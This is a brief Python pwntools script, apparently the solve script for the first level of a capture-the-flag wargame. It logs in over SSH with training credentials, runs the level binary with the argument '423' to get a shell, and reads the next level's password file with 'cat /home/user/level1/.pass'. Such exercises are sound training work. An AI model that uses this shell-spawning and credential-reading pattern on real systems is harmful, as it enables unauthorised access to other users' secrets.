#!/usr/bin/env python3
from pwn import *

# Configuration
context.arch = 'amd64'  # Architecture du binaire
context.log_level = 'info'  # Niveau de log (debug, info, warning, error)

# Variables pour la connexion
LOCAL = False  # Mettre à False pour l'exploitation SSH
HOST = "localhost"  # Hôte pour SSH
PORT = 8888  # Port pour SSH
USER = "level0"  # Nom d'utilisateur SSH
PASSWORD = "level0"  # Mot de passe SSH

def get_connection():
    if LOCAL:
        # Connexion locale avec le paramètre 423
        return process(['./Resources/level0', '423'])  # Passage de 423 comme argument
    else:
        # Connexion SSH
        shell = ssh(host=HOST, port=PORT, user=USER, password=PASSWORD)
        return shell.process(['/home/user/level0/level0', '423'])

def exploit():
    # Établir la connexion
    conn = get_connection()
    
    # Attendre que le shell soit disponible
    conn.recvuntil(b'$')
    
    # Lire le flag
    conn.sendline(b'cat /home/user/level1/.pass')
    flag = conn.recvline()
    print("\n=== Flag ===")
    print(flag.decode().strip())
    
    # Interactif mode si nécessaire
    conn.interactive()

if __name__ == "__main__":
    exploit() 